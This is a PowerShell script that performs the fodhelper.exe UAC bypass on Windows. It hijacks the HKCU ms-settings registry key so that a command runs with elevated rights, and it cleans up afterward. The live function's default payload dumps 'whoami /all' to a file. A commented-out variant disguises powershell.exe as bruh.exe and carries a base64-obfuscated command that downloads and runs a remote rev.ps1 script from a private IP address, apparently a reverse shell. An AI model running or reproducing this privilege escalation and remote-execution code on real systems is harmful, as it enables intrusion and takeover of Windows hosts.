#function RegShit {
#    $cmd = "C:\Windows\Tasks\bruh.exe -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAOQAyAC4AMQAzADQALwByAGUAdgAuAHAAcwAxACcAKQA="
#    copy C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Tasks\bruh.exe
#    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
#    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
#    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
#    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $cmd -Force
#}
#function PrivEsc {
#    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
#    Start-Sleep -s 3
#    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
#}
#RegShit



function FodhelperBypass(){ 
 
Param (    
 
 [String]$program = "cmd /c echo whoami /all > C:\fodhelper.txt" 
 
      )
 
#Create registry structure
 
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
 
#Perform the bypass
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 
#Remove registry structure
Start-Sleep 3
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
 
}
